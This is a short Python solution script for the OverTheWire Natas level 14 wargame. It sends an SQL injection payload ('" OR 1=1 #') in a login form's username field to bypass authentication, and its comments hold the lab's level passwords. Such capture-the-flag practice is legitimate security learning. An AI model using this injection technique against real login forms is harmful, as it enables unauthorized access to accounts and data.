#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas14"
password = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"

url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()

sqli = '" OR 1=1 #'

post_data = {"username": sqli, "password": "123", "submit": "submit"}

response = session.post(url, data=post_data, auth=(username, password))

content = response.text
soup = BeautifulSoup(content, "html.parser")

print(soup)
# print content

# let's view the source
# it's clearly looks like a SQLi challenge, so let's try to break and fix
# the query with our input to get login successfully.
# The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

